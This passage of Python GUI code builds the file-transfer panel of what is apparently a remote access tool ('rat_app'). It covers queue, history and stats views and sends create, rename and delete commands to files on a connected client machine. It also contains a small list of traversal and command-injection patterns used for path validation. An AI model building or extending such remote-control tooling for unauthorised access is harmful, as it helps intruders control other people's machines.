                                                  size=FONT_STYLES["subheading"][1], 
                                                  weight=FONT_STYLES["subheading"][2]))
        download_title.pack(anchor="w", padx=15, pady=10)
        
        self.download_stats_label = ctk.CTkLabel(download_card, text="Total: 0 files\nSize: 0 B",
                                            font=ctk.CTkFont(size=16),
                                            justify="left")
        self.download_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Card 3 - Overall Stats
        overall_card = ctk.CTkFrame(top_row, fg_color=theme["card_color"],
                                corner_radius=10)
        overall_card.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        
        overall_title = ctk.CTkLabel(overall_card, text="📊 Overall Statistics", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        overall_title.pack(anchor="w", padx=15, pady=10)
        
        self.overall_stats_label = ctk.CTkLabel(overall_card, 
                                           text="Success Rate: 0%\nAvg. Speed: 0 B/s",
                                           font=ctk.CTkFont(size=16),
                                           justify="left")
        self.overall_stats_label.pack(anchor="w", padx=15, pady=10)
        
        # Bottom row for charts
        charts_row = ctk.CTkFrame(stats_container, fg_color=theme["card_color"],
                               corner_radius=10, height=300)
        charts_row.pack(fill=tk.BOTH, expand=True, padx=5, pady=10)
        charts_row.pack_propagate(False)  # Prevent shrinking
        
        charts_title = ctk.CTkLabel(charts_row, text="📈 Transfer Activity", 
                                 font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                size=FONT_STYLES["subheading"][1], 
                                                weight=FONT_STYLES["subheading"][2]))
        charts_title.pack(anchor="w", padx=15, pady=10)
        
        # Placeholder for chart - would be implemented with a charting library
        chart_placeholder = ctk.CTkLabel(charts_row, text="Activity chart will appear here",
                                     font=ctk.CTkFont(size=14))
        chart_placeholder.pack(pady=100)
    
    def setup_status_section(self, theme):
        """Create an enhanced status section with more metrics and controls."""
        self.status_card = ctk.CTkFrame(self.file_frame, fg_color=theme["card_color"],
                                 corner_radius=10)
        self.status_card.pack(fill=tk.X, padx=15, pady=15)
        
        # First row with status and controls
        status_header = ctk.CTkFrame(self.status_card, fg_color="transparent")
        status_header.pack(fill=tk.X, padx=15, pady=(10, 5))
        
        status_title = ctk.CTkLabel(status_header, text="🔄 Transfer Status", 
                                  font=ctk.CTkFont(family=FONT_STYLES["subheading"][0], 
                                                 size=FONT_STYLES["subheading"][1], 
                                                 weight=FONT_STYLES["subheading"][2]))
        status_title.pack(side=tk.LEFT, anchor="w")
        
        # Current status
        status_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        status_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
        
        status_label = ctk.CTkLabel(status_frame, text="Status:", 
                                  font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                 size=FONT_STYLES["normal"][1], 
                                                 weight="bold"))
        status_label.pack(side=tk.LEFT, padx=5)
        
        self.status_value = ctk.CTkLabel(status_frame, text="Idle",
                                      font=ctk.CTkFont(family=FONT_STYLES["normal"][0], 
                                                     size=FONT_STYLES["normal"][1]))
        self.status_value.pack(side=tk.LEFT, padx=5)
        
        # Transfer metrics
        metrics_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        metrics_frame.pack(fill=tk.X, padx=15, pady=(0, 5))
        
        # Speed indicator
        speed_container = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        speed_container.pack(side=tk.LEFT, padx=10)
        
        speed_label_text = ctk.CTkLabel(speed_container, text="Speed:", 
                                     font=ctk.CTkFont(weight="bold"))
        speed_label_text.pack(side=tk.LEFT, padx=2)
        
        self.speed_label = ctk.CTkLabel(speed_container, text="0 B/s")
        self.speed_label.pack(side=tk.LEFT, padx=2)
        
        # ETA indicator
        eta_container = ctk.CTkFrame(metrics_frame, fg_color="transparent")
        eta_container.pack(side=tk.LEFT, padx=10)
        
        eta_label_text = ctk.CTkLabel(eta_container, text="ETA:", 
                                   font=ctk.CTkFont(weight="bold"))
        eta_label_text.pack(side=tk.LEFT, padx=2)
        
        self.eta_label = ctk.CTkLabel(eta_container, text="--:--")
        self.eta_label.pack(side=tk.LEFT, padx=2)
        
        # Progress indicators row
        progress_frame = ctk.CTkFrame(self.status_card, fg_color="transparent")
        progress_frame.pack(fill=tk.X, padx=15, pady=(5, 10))
        
        # Enhanced progress bar with percentage
        progress_container = ctk.CTkFrame(progress_frame, fg_color="transparent")
        progress_container.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5)
        
        progress_top = ctk.CTkFrame(progress_container, fg_color="transparent")
        progress_top.pack(fill=tk.X)
        
        self.progress_text = ctk.CTkLabel(progress_top, text="0%", anchor="e")
        self.progress_text.pack(side=tk.RIGHT, padx=5)
        
        self.progress_details = ctk.CTkLabel(progress_top, text="0 B / 0 B", anchor="w")
        self.progress_details.pack(side=tk.LEFT, padx=5)
        
        self.progress_bar = ctk.CTkProgressBar(progress_container, height=15, corner_radius=8,
                                           progress_color=theme["accent_color"])
        self.progress_bar.pack(fill=tk.X, pady=5)
        self.progress_bar.set(0)
        
        # Control buttons
        buttons_frame = ctk.CTkFrame(progress_frame, fg_color="transparent")
        buttons_frame.pack(side=tk.RIGHT, padx=5)
        
        # Pause/Resume toggle
        self.pause_btn = ctk.CTkButton(buttons_frame, text="Pause", 
                                   command=self.toggle_pause_resume,
                                   state="disabled", width=80,
                                   fg_color=theme["button_color"],
                                   hover_color=theme["hover_color"],
                                   corner_radius=8)
        self.pause_btn.pack(side=tk.LEFT, padx=5)
        
        # Resume saved transfers
        self.resume_btn = ctk.CTkButton(buttons_frame, text="Resume", 
                                    command=self.show_resume_dialog, 
                                    state="disabled", width=80,
                                    fg_color=theme["button_color"],
                                    hover_color=theme["hover_color"],
                                    corner_radius=8)
        self.resume_btn.pack(side=tk.LEFT, padx=5)
        
        # Cancel button
        self.cancel_btn = ctk.CTkButton(buttons_frame, text="Cancel", 
                                    command=self.cancel_transfer, 
                                    state="disabled", width=80,
                                    fg_color=theme["danger_color"],
                                    hover_color=theme["hover_color"],
                                    corner_radius=8)
        self.cancel_btn.pack(side=tk.LEFT, padx=5)
    
    def configure_treeview_style(self, theme):
        """Configure unified treeview styling."""
        style = ttk.Style()
        style.configure("Custom.Treeview", 
                        background=theme["bg_color"],
                        foreground=theme["fg_color"],
                        fieldbackground=theme["card_color"],
                        borderwidth=0,
                        highlightthickness=0)
        
        style.map("Custom.Treeview",
                background=[("selected", theme["accent_color"])],
                foreground=[("selected", "#FFFFFF")])
        
        style.configure("Custom.Treeview.Heading",
                       background=theme["card_color"],
                       foreground=theme["fg_color"],
                       borderwidth=1)
        
        style.map("Custom.Treeview.Heading",
                 background=[("active", theme["hover_color"])])
        
        # Configure scrollbar style
        style.configure("Custom.Vertical.TScrollbar", 
                       background=theme["bg_color"],
                       troughcolor=theme["bg_color"],
                       arrowcolor=theme["fg_color"])
        
        style.configure("Custom.Horizontal.TScrollbar", 
                       background=theme["bg_color"],
                       troughcolor=theme["bg_color"],
                       arrowcolor=theme["fg_color"])
    
    def bind_events(self):
        """Bind events for enhanced interactivity."""
        # Bind filter entry to apply filter on keyup
        if hasattr(self, 'filter_entry'):
            self.filter_entry.bind("<KeyRelease>", self.apply_file_filter)
        
        # Bind selection events to update buttons and counters
        if hasattr(self, 'files_tree'):
            self.files_tree.bind("<<TreeviewSelect>>", self.update_selection_count)
        
        if hasattr(self, 'queue_tree'):
            self.queue_tree.bind("<<TreeviewSelect>>", self.update_queue_selection)
        
        # Bind notebook tab change to update the UI for the current tab
        self.transfer_notebook.bind("<<NotebookTabChanged>>", self.on_tab_changed)
    
    def create_treeview_context_menu(self, treeview):
        """Create a context menu for treeview operations."""
        self.context_menu = tk.Menu(treeview, tearoff=0)
        self.context_menu.add_command(label="Download", command=self.download_file)
        self.context_menu.add_command(label="Add to Queue", command=self.add_to_queue)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Create Folder", command=self.create_remote_folder)
        self.context_menu.add_command(label="Rename", command=self.rename_remote_file)
        self.context_menu.add_command(label="Delete", command=self.delete_remote_file)
        self.context_menu.add_separator()
        self.context_menu.add_command(label="Copy Path", command=self.copy_path_to_clipboard)
        self.context_menu.add_command(label="Refresh", command=self.list_remote_files)
    
    def create_queue_context_menu(self):
        """Create a context menu for queue operations."""
        self.queue_menu = tk.Menu(self.queue_tree, tearoff=0)
        self.queue_menu.add_command(label="Process Now", command=self.process_selected_queue)
        self.queue_menu.add_command(label="Remove", command=self.remove_from_queue)
        self.queue_menu.add_separator()
        self.queue_menu.add_command(label="Move Up", command=lambda: self.move_queue_item("up"))
        self.queue_menu.add_command(label="Move Down", command=lambda: self.move_queue_item("down"))
        self.queue_menu.add_separator()
        self.queue_menu.add_command(label="Change Priority", command=self.change_queue_priority)
    
    #--------------------------------------------------------
    # Event Handlers and UI Update Methods
    #--------------------------------------------------------
    
    def show_context_menu(self, event):
        """Show the context menu on right-click."""
        if hasattr(self, 'context_menu'):
            try:
                # Select the item under the cursor
                item = self.files_tree.identify_row(event.y)
                if item:
                    self.files_tree.selection_set(item)
                    self.context_menu.post(event.x_root, event.y_root)
            except:
                pass
    
    def show_queue_context_menu(self, event):
        """Show the queue context menu on right-click."""
        if hasattr(self, 'queue_menu'):
            try:
                # Select the item under the cursor
                item = self.queue_tree.identify_row(event.y)
                if item:
                    self.queue_tree.selection_set(item)
                    self.queue_menu.post(event.x_root, event.y_root)
            except:
                pass
    
    def on_tab_changed(self, event):
        """Handle actions when notebook tab is changed."""
        # Get the selected tab
        selected_tab = self.transfer_notebook.select()
        tab_id = self.transfer_notebook.index(selected_tab)
        
        # Perform tab-specific actions
        if tab_id == 0:  # Upload tab
            pass  # Any upload tab specific actions
        elif tab_id == 1:  # Download tab
            # Refresh file listing if client is connected
            if self.rat_app.current_client_socket:
                self.list_remote_files()
        elif tab_id == 2:  # Queue tab
            self.update_queue_display()
        elif tab_id == 3:  # History tab
            self.update_history_display()
    
    def update_selection_count(self, event=None):
        """Update the selection count indicator."""
        if hasattr(self, 'selection_count') and hasattr(self, 'files_tree'):
            selection = self.files_tree.selection()
            count = len(selection)
            
            if count == 0:
                self.selection_count.configure(text="No files selected")
            elif count == 1:
                item = self.files_tree.item(selection[0])
                file_type = item['values'][2] if len(item['values']) > 2 else ""
                if file_type.lower() == "folder":
                    self.selection_count.configure(text="1 folder selected")
                else:
                    self.selection_count.configure(text="1 file selected")
            else:
                self.selection_count.configure(text=f"{count} items selected")
    
    def update_queue_selection(self, event=None):
        """Update UI based on queue item selection."""
        if hasattr(self, 'queue_tree'):
            selection = self.queue_tree.selection()
            # Enable/disable buttons based on selection
            has_selection = len(selection) > 0
            # Update any relevant controls...
    
    def update_queue_display(self):
        """Update the queue display with current queue items."""
        if not hasattr(self, 'queue_tree'):
            return
            
        # Clear existing items
        for item in self.queue_tree.get_children():
            self.queue_tree.delete(item)
            
        # Check if we have any queue items
        if not hasattr(self, 'queue_items'):
            self.queue_items = []
            
        # Populate with queue items
        for i, item in enumerate(self.queue_items):
            self.queue_tree.insert("", "end", values=(
                i+1,
                item.get('type', 'Unknown'),
                item.get('source', ''),
                item.get('destination', ''),
                item.get('size', '0 B'),
                item.get('priority', 'Normal'),
                item.get('status', 'Pending')
            ))
            
        # Update queue count
        if hasattr(self, 'queue_count'):
            count = len(self.queue_items)
            self.queue_count.configure(text=f"{count} {'item' if count == 1 else 'items'}")
    
    def update_history_display(self):
        """Update the history display with transfer history."""
        if not hasattr(self, 'history_tree'):
            return
            
        # Clear existing items
        for item in self.history_tree.get_children():
            self.history_tree.delete(item)
            
        # Check if we have history items
        if not hasattr(self, 'history_items'):
            self.history_items = []
            
        # Filter history based on current filters
        filtered_items = self.filter_history_items()
            
        # Populate with history items
        for item in filtered_items:
            self.history_tree.insert("", "end", values=(
                item.get('date', ''),
                item.get('time', ''),
                item.get('type', ''),
                item.get('file', ''),
                item.get('size', ''),
                item.get('destination', ''),
                item.get('status', ''),
                item.get('duration', '')
            ))
            
        # Update statistics display
        self.update_history_stats(filtered_items)
    
    def update_history_stats(self, history_items):
        """Update the statistics view with calculated stats."""
        if not history_items:
            # Set default "no data" values
            if hasattr(self, 'upload_stats_label'):
                self.upload_stats_label.configure(text="Total: 0 files\nSize: 0 B")
            if hasattr(self, 'download_stats_label'):
                self.download_stats_label.configure(text="Total: 0 files\nSize: 0 B")
            if hasattr(self, 'overall_stats_label'):
                self.overall_stats_label.configure(text="Success Rate: 0%\nAvg. Speed: 0 B/s")
            return
        
        # Calculate stats for uploads
        upload_items = [item for item in history_items if item.get('type') == 'Upload']
        upload_count = len(upload_items)
        upload_size = sum(self.parse_size(item.get('size', '0 B')) for item in upload_items)
        
        # Calculate stats for downloads
        download_items = [item for item in history_items if item.get('type') == 'Download']
        download_count = len(download_items)
        download_size = sum(self.parse_size(item.get('size', '0 B')) for item in download_items)
        
        # Calculate overall stats
        total_count = len(history_items)
        successful_items = [item for item in history_items if item.get('status') == 'Complete']
        success_rate = (len(successful_items) / total_count * 100) if total_count > 0 else 0
        
        # Calculate average speed
        total_bytes = upload_size + download_size
        total_duration_sec = sum(self.parse_duration(item.get('duration', '0s')) for item in history_items)
        avg_speed = total_bytes / total_duration_sec if total_duration_sec > 0 else 0
        
        # Update UI labels
        if hasattr(self, 'upload_stats_label'):
            self.upload_stats_label.configure(
                text=f"Total: {upload_count} {'file' if upload_count == 1 else 'files'}\n"
                     f"Size: {self.format_size(upload_size)}"
            )
        
        if hasattr(self, 'download_stats_label'):
            self.download_stats_label.configure(
                text=f"Total: {download_count} {'file' if download_count == 1 else 'files'}\n"
                     f"Size: {self.format_size(download_size)}"
            )
        
        if hasattr(self, 'overall_stats_label'):
            self.overall_stats_label.configure(
                text=f"Success Rate: {success_rate:.1f}%\n"
                     f"Avg. Speed: {self.format_size(avg_speed)}/s"
            )
    
    def filter_history_items(self):
        """Filter history items based on current filter settings."""
        if not hasattr(self, 'history_items'):
            return []
            
        # Start with all items
        filtered_items = self.history_items.copy()
        
        # Apply date range filter
        if hasattr(self, 'date_range_var'):
            date_range = self.date_range_var.get()
            if date_range != "All Time":
                # Get current date
                today = datetime.now().date()
                
                if date_range == "Today":
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) == today]
                elif date_range == "Last 7 Days":
                    cutoff_date = today - datetime.timedelta(days=7)
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) >= cutoff_date]
                elif date_range == "Last 30 Days":
                    cutoff_date = today - datetime.timedelta(days=30)
                    filtered_items = [item for item in filtered_items 
                                     if self.parse_date(item.get('date', '')) >= cutoff_date]
        
        # Apply type filter
        if hasattr(self, 'type_filter_var'):
            type_filter = self.type_filter_var.get()
            if type_filter != "All":
                filtered_items = [item for item in filtered_items 
                                 if item.get('type', '') == type_filter]
        
        return filtered_items
    
    def parse_date(self, date_str):
        """Parse date string into datetime.date object."""
        try:
            return datetime.strptime(date_str, "%Y-%m-%d").date()
        except:
            return datetime.now().date()
    
    def parse_size(self, size_str):
        """Parse size string like '1.5 MB' into bytes."""
        try:
            # Split into number and unit
            parts = size_str.split()
            if len(parts) != 2:
                return 0
                
            size_val = float(parts[0])
            unit = parts[1]
            
            # Convert to bytes based on unit
            units = {'B': 1, 'KB': 1024, 'MB': 1024**2, 'GB': 1024**3, 'TB': 1024**4}
            return size_val * units.get(unit, 1)
        except:
            return 0
    
    def parse_duration(self, duration_str):
        """Parse duration string like '1m 30s' into seconds."""
        try:
            total_seconds = 0
            # Check for minutes
            if 'm' in duration_str:
                min_parts = duration_str.split('m')
                total_seconds += int(min_parts[0]) * 60
                duration_str = min_parts[1]
            
            # Check for seconds
            if 's' in duration_str:
                sec_parts = duration_str.split('s')
                if sec_parts[0].strip():
                    total_seconds += int(sec_parts[0])
            
            return total_seconds or 1  # Avoid division by zero
        except:
            return 1  # Default to 1 second
    
    def apply_file_filter(self, event=None):
        """Apply filter to the remote files view."""
        if not hasattr(self, 'filter_entry') or not hasattr(self, 'files_tree'):
            return
            
        filter_text = self.filter_entry.get().lower()
        
        # If we have original data stored, use it
        if not hasattr(self, 'original_file_data'):
            # No original data to filter
            return
            
        # Clear current tree
        for item in self.files_tree.get_children():
            self.files_tree.delete(item)
            
        # Apply filter and repopulate
        for file_info in self.original_file_data:
            # Skip hidden files unless show_hidden is enabled
            if not self.show_hidden_files and file_info[0].startswith('.'):
                continue
                
            # Check if any part of the file info matches the filter
            if any(filter_text in str(value).lower() for value in file_info):
                self.files_tree.insert("", "end", values=file_info)
        
        # Update file count
        item_count = len(self.files_tree.get_children())
        if hasattr(self, 'file_count_label'):
            self.file_count_label.configure(text=f"{item_count} {'item' if item_count == 1 else 'items'}")
    
    def toggle_hidden_files(self):
        """Toggle showing hidden files."""
        theme = self.get_theme_colors()
        self.show_hidden_files = not self.show_hidden_files
        
        # Update button appearance
        if hasattr(self, 'toggle_hidden_btn'):
            self.toggle_hidden_btn.configure(
                fg_color=theme["accent_color"] if self.show_hidden_files else theme["button_color"]
            )
            
        # Refresh file list with new setting
        self.apply_file_filter()
    
    def sort_treeview(self, treeview, column):
        """Sort treeview by the specified column."""
        # Get all items with their values
        data = [(treeview.item(item, "values"), item) for item in treeview.get_children("")]
        
        # Determine column index
        if isinstance(column, str):
            columns = treeview["columns"]
            column_idx = columns.index(column)
        else:
            column_idx = column
            
        # Remember current sort settings
        if hasattr(self, 'current_sort_column') and self.current_sort_column == column:
            # Toggle direction if same column
            self.sort_direction = "descending" if self.sort_direction == "ascending" else "ascending"
        else:
            # New column, reset to ascending
            self.current_sort_column = column
            self.sort_direction = "ascending"
        
        # Sort by the specified column
        reverse_sort = self.sort_direction == "descending"
        
        # Special handling for different column types
        if column in ["Size", "Modified"]:
            # For size column, extract numeric value for sorting
            if column == "Size":
                # Custom sort function for size values
                def get_size_value(item_data):
                    size_str = item_data[0][column_idx]
                    return self.parse_size(size_str)
                
                data.sort(key=get_size_value, reverse=reverse_sort)
            else:
                # Date sorting
                data.sort(key=lambda x: x[0][column_idx], reverse=reverse_sort)
        else:
            # Regular string sorting
            data.sort(key=lambda x: x[0][column_idx].lower() if isinstance(x[0][column_idx], str) else x[0][column_idx], 
                     reverse=reverse_sort)
        
        # Special handling for folders to always appear first
        if column == "Name" and "Type" in treeview["columns"]:
            type_idx = treeview["columns"].index("Type")
            
            # Separate folders and files
            folders = [item for item in data if item[0][type_idx].lower() == "folder"]
            files = [item for item in data if item[0][type_idx].lower() != "folder"]
            
            # Sort each group separately
            folders.sort(key=lambda x: x[0][column_idx].lower(), reverse=reverse_sort)
            files.sort(key=lambda x: x[0][column_idx].lower(), reverse=reverse_sort)
            
            # Combine with folders first
            data = folders + files
        
        # Clear and repopulate the treeview
        for item in treeview.get_children(""):
            treeview.delete(item)
            
        for item_values, item_id in data:
            treeview.insert("", "end", values=item_values)
        
        # Update column heading to show sort direction
        for col in treeview["columns"]:
            if col == column:
                direction_indicator = " ▲" if self.sort_direction == "ascending" else " ▼"
                treeview.heading(col, text=f"{col}{direction_indicator}")
            else:
                # Remove indicators from other columns
                treeview.heading(col, text=col.replace(" ▲", "").replace(" ▼", ""))
    
    #--------------------------------------------------------
    # Helper Methods and Utilities
    #--------------------------------------------------------
    
    def clear_file_info(self):
        """Clear the file information display."""
        if hasattr(self, 'upload_info_text'):
            self.upload_info_text.configure(state="normal")
            self.upload_info_text.delete(1.0, tk.END)
            self.upload_info_text.configure(state="disabled")
    
    def toggle_multiple_files_mode(self):
        """Toggle between single and multiple file upload mode."""
        # Implementation depends on how multiple file upload is handled
        is_multiple = self.multiple_files_var.get()
        
        if is_multiple:
            # Update UI for multiple file selection
            if hasattr(self, 'upload_btn'):
                self.upload_btn.configure(text="Upload Files")
        else:
            # Update UI for single file selection
            if hasattr(self, 'upload_btn'):
                self.upload_btn.configure(text="Upload File")
    
    def show_recent_paths(self):
        """Show a popup with recent destination paths."""
        # Implementation would depend on storing and retrieving recent paths
        pass
    
    def show_bookmarks(self):
        """Show a popup with bookmarked remote locations."""
        # Implementation would depend on storing and retrieving bookmarks
        pass
    
    def navigate_back(self):
        """Navigate to parent directory in remote file browser."""
        if not hasattr(self, 'remote_path_entry'):
            return
            
        current_path = self.remote_path_entry.get()
        
        # Handle both slash types
        if '\\' in current_path:
            separator = '\\'
        else:
            separator = '/'
            
        # Remove trailing separator if it exists
        if current_path.endswith(separator):
            current_path = current_path[:-1]
            
        # Find last separator
        last_sep_index = current_path.rfind(separator)
        if last_sep_index > 0:
            # Navigate to parent directory
            parent_path = current_path[:last_sep_index + 1]  # Keep the separator
            self.remote_path_entry.delete(0, tk.END)
            self.remote_path_entry.insert(0, parent_path)
            
            # Refresh the file list
            self.list_remote_files()
    
    def create_remote_folder(self):
        """Create a new folder on the remote system with improved error handling."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get current path
        current_path = self.remote_path_entry.get()
        
        # Ask for folder name with validation
        folder_name = simpledialog.askstring("Create Folder", "Enter folder name:")
        if not folder_name:
            return
            
        # Validate folder name (no illegal characters)
        invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
        if any(char in folder_name for char in invalid_chars):
            messagebox.showerror("Invalid Name", "Folder name contains invalid characters")
            return
            
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for new folder
        new_folder_path = current_path + folder_name
        
        # Send command to create folder
        try:
            command = f"MKDIR|{new_folder_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Set timeout for response
            self.rat_app.current_client_socket.settimeout(10)
            
            try:
                # Wait for response
                response = self.rat_app.current_client_socket.recv(1024).decode()
                
                if response.startswith("SUCCESS"):
                    self.rat_app.log(f"Created folder: {new_folder_path}")
                    # Refresh file list
                    self.list_remote_files()
                else:
                    self.rat_app.log(f"Failed to create folder: {response}")
                    messagebox.showerror("Error", f"Failed to create folder: {response}")
            except socket.timeout:
                self.rat_app.log("Timeout waiting for create folder response")
                messagebox.showerror("Error", "Connection timeout")
            finally:
                self.rat_app.current_client_socket.settimeout(None)
                    
        except Exception as e:
            self.rat_app.log(f"Error creating folder: {e}")
            messagebox.showerror("Error", f"Error creating folder: {e}")
        
    def rename_remote_file(self):
        """Rename a file or folder on the remote system."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected item
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select a file or folder to rename")
            return
            
        # Get item information
        item = self.files_tree.item(selection[0])
        values = item["values"]
        
        if len(values) < 1:
            return
            
        # Get file name and current path
        file_name = values[0]
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for file
        file_path = current_path + file_name
        
        # Ask for new name
        new_name = simpledialog.askstring("Rename", "Enter new name:", initialvalue=file_name)
        if not new_name or new_name == file_name:
            return
            
        # Full path for new name
        new_path = current_path + new_name
        
        # Send command to rename
        try:
            command = f"RENAME|{file_path}|{new_path}"
            self.rat_app.current_client_socket.send(command.encode())
            
            # Wait for response
            response = self.rat_app.current_client_socket.recv(1024).decode()
            
            if response.startswith("SUCCESS"):
                self.rat_app.log(f"Renamed: {file_path} to {new_path}")
                # Refresh file list
                self.list_remote_files()
            else:
                self.rat_app.log(f"Failed to rename: {response}")
                messagebox.showerror("Error", f"Failed to rename: {response}")
                
        except Exception as e:
            self.rat_app.log(f"Error renaming: {e}")
            messagebox.showerror("Error", f"Error renaming: {e}")
    
    def delete_remote_file(self):
        """Delete a file or folder on the remote system with improved safety checks."""
        if not self.rat_app.current_client_socket:
            messagebox.showinfo("Not Connected", "Please connect to a client first")
            return
            
        # Get selected items
        selection = self.files_tree.selection()
        if not selection:
            messagebox.showinfo("No Selection", "Please select files or folders to delete")
            return
            
        # Confirm deletion with item count and warning
        count = len(selection)
        if count == 1:
            item = self.files_tree.item(selection[0])
            file_name = item["values"][0]
            file_type = item["values"][2] if len(item["values"]) > 2 else ""
            
            if file_type.lower() == "folder":
                confirm = messagebox.askyesno("Confirm Delete", 
                                            f"Are you sure you want to delete the folder '{file_name}'?\n\n" + 
                                            "Note: Only empty folders can be deleted.",
                                            icon="warning")
            else:
                confirm = messagebox.askyesno("Confirm Delete", 
                                            f"Are you sure you want to delete '{file_name}'?",
                                            icon="warning")
        else:
            confirm = messagebox.askyesno("Confirm Delete", 
                                        f"Are you sure you want to delete {count} items?",
                                        icon="warning")
            
        if not confirm:
            return
            
        # Process each selected item
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        success_count = 0
        error_count = 0
        error_messages = []
        
        for item_id in selection:
            item = self.files_tree.item(item_id)
            file_name = item["values"][0]
            file_type = item["values"][2] if len(item["values"]) > 2 else ""
            
            # Full path for file
            file_path = current_path + file_name
            
            # Send command to delete
            try:
                if file_type.lower() == "folder":
                    command = f"RMDIR|{file_path}"
                else:
                    command = f"DELETE|{file_path}"
                    
                self.rat_app.current_client_socket.send(command.encode())
                
                # Set timeout for response
                self.rat_app.current_client_socket.settimeout(10)
                
                try:
                    # Wait for response
                    response = self.rat_app.current_client_socket.recv(1024).decode()
                    
                    if response.startswith("SUCCESS"):
                        success_count += 1
                        self.rat_app.log(f"Deleted: {file_path}")
                    else:
                        error_count += 1
                        error_msg = f"Failed to delete {file_name}: {response}"
                        self.rat_app.log(error_msg)
                        error_messages.append(error_msg)
                except socket.timeout:
                    error_count += 1
                    error_msg = f"Timeout deleting {file_name}"
                    self.rat_app.log(error_msg)
                    error_messages.append(error_msg)
                finally:
                    self.rat_app.current_client_socket.settimeout(None)
                    
            except Exception as e:
                error_count += 1
                error_msg = f"Error deleting {file_name}: {e}"
                self.rat_app.log(error_msg)
                error_messages.append(error_msg)
        
        # Show result summary
        if error_count == 0:
            messagebox.showinfo("Delete Complete", f"Successfully deleted {success_count} {'item' if success_count == 1 else 'items'}")
        else:
            # Create detailed error report
            error_report = "\n".join(error_messages[:5])  # Show first 5 errors
            if len(error_messages) > 5:
                error_report += f"\n\n...and {len(error_messages) - 5} more errors"
                
            messagebox.showwarning("Delete Partial", 
                                f"Deleted {success_count} items, but encountered {error_count} errors.\n\n" + 
                                error_report)
            
        # Refresh file list
        self.list_remote_files()

    def validate_path(self, path):
        """Validate a path to ensure it's safe and well-formed."""
        # Check for empty path
        if not path or path.strip() == "":
            return False, "Empty path"
            
        # Check for extremely long paths
        if len(path) > 260:  # Windows MAX_PATH limit
            return False, "Path too long"
            
        # Check for suspicious patterns (varies by platform)
        suspicious_patterns = [
            "../", "..\\",  # Directory traversal
            "~", "||", "&&", ";", "|",  # Command injection characters
            "%TEMP%", "%APPDATA%", "%USERPROFILE%",  # Environment variables
            "$HOME", "$USER",  # Unix environment variables
        ]
        
        for pattern in suspicious_patterns:
            if pattern in path:
                return False, f"Path contains suspicious pattern: {pattern}"
                
        return True, ""


    def sanitize_filename(self, filename):
        """Sanitize a filename to remove unsafe characters."""
        # Replace invalid characters
        invalid_chars = ['<', '>', ':', '"', '/', '\\', '|', '?', '*']
        for char in invalid_chars:
            filename = filename.replace(char, '_')
            
        # Remove control characters
        filename = ''.join(c for c in filename if ord(c) >= 32)
        
        # Limit length
        max_length = 255  # Common filesystem limit
        if len(filename) > max_length:
            filename = filename[:max_length]
            
        return filename
    

    def calculate_file_hash(self, file_path, algorithm='md5'):
        """Calculate hash of a file for integrity verification."""
        try:
            # Select hash algorithm
            if algorithm.lower() == 'md5':
                hash_algo = hashlib.md5()
            elif algorithm.lower() == 'sha1':
                hash_algo = hashlib.sha1()
            elif algorithm.lower() == 'sha256':
                hash_algo = hashlib.sha256()
            else:
                self.rat_app.log(f"Unsupported hash algorithm: {algorithm}")
                return None
                
            # Read file in chunks and update hash
            with open(file_path, 'rb') as f:
                for chunk in iter(lambda: f.read(self.CHUNK_SIZE), b''):
                    hash_algo.update(chunk)
                    
            return hash_algo.hexdigest()
            
        except Exception as e:
            self.rat_app.log(f"Error calculating file hash: {e}")
            return None
    
    def copy_path_to_clipboard(self):
        """Copy selected file path to clipboard."""
        if not hasattr(self, 'files_tree'):
            return
            
        selection = self.files_tree.selection()
        if not selection:
            return
            
        # Get item information
        item = self.files_tree.item(selection[0])
        file_name = item["values"][0]
        
        # Get current path
        current_path = self.remote_path_entry.get()
        
        # Ensure path ends with separator
        if not current_path.endswith('\\') and not current_path.endswith('/'):
            if '\\' in current_path:
                current_path += '\\'
            else:
                current_path += '/'
                
        # Full path for file
        file_path = current_path + file_name
        
        # Copy to clipboard
        self.parent.clipboard_clear()
        self.parent.clipboard_append(file_path)
        
        # Show feedback
        self.rat_app.log(f"Copied to clipboard: {file_path}")
        
        # Optional toast notification
        self.show_toast_notification("Path copied to clipboard")
    
    def show_toast_notification(self, message, duration=2000):
        """Show a temporary toast notification."""
        # Create toast window
        theme = self.get_theme_colors()
        toast = ctk.CTkToplevel(self.parent)
        toast.title("")
        toast.overrideredirect(True)  # Remove window decorations
        
        # Calculate position (bottom right of parent window)
        parent_x = self.parent.winfo_rootx()
        parent_y = self.parent.winfo_rooty()
        parent_width = self.parent.winfo_width()
        parent_height = self.parent.winfo_height()
        
        # Create toast content
        toast_frame = ctk.CTkFrame(toast, fg_color=theme["card_color"],
                               corner_radius=10)
        toast_frame.pack(padx=2, pady=2)
        
        toast_label = ctk.CTkLabel(toast_frame, text=message, 
